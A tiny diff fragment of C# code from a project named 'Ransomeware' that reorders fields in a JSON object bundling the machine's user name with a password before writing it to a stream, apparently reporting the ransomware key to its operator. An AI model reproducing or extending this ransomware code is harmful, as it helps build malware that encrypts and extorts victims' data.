@@ -32,8 +32,8 @@ namespace Ransomeware
             {
                 string json = new JavaScriptSerializer().Serialize(new
                 {
-                    pass = password,
-                    user = Environment.UserName
+                    user = Environment.UserName,
+                    pass = password
                 });
 
                 streamWriter.Write(json);
